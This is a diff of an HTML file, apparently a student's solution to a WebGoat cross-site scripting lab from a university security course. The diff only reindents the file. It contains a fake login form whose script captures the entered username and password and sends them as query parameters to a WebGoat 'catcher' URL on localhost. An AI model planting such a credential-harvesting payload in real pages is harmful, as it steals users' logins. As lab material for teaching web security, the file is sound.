@@ -1,27 +1,26 @@
 <!DOCTYPE html>
 <html>
-	<head>
-	</head>
-	<body>
-		<h1>Login Form</h1>
-		<h3>Please login:</h3><hr>
-		<form id = "user_form">
-
-			User Name:<br><input type="text" name="user" id="ece568-2020-user"><br>
-			Password:<br><input type="password" type="text" name="pass" id="ece568-2020-pass"><br>
-			<br><input id="ece568-2020-submit" type="submit" value="Login" onclick="attack();"><br>
-		</form>
-		<script>
-			function attack() {
-				var username = document.forms[0].user.value;
-				var password = document.forms[0].pass.value;
-				alert("Login="+username + " Password="+password);
-				XSSImage = new Image;
-				XSSImage.src = "http://localhost:8090/WebGoat/catcher"
-				  +"?PROPERTY=yes"
-				  +"&phishUsername="+username
-				  +"&phishPassword="+password;
-				}
-		</script>
-	</body>
+    <head>
+    </head>
+    <body>
+        <h1>Login Form</h1>
+        <h3>Please login:</h3><hr>
+        <form id = "user_form">
+            User Name:<br><input type="text" name="user" id="ece568-2020-user"><br>
+            Password:<br><input type="password" type="text" name="pass" id="ece568-2020-pass"><br>
+            <br><input id="ece568-2020-submit" type="submit" value="Login" onclick="attack();"><br>
+        </form>
+        <script>
+            function attack() {
+                var username = document.forms[0].user.value;
+                var password = document.forms[0].pass.value;
+                alert("Login="+username + " Password="+password);
+                XSSImage = new Image;
+                XSSImage.src = "http://localhost:8090/WebGoat/catcher"
+                    +"?PROPERTY=yes"
+                    +"&phishUsername="+username
+                    +"&phishPassword="+password;
+            }
+        </script>
+    </body>
 </html> 
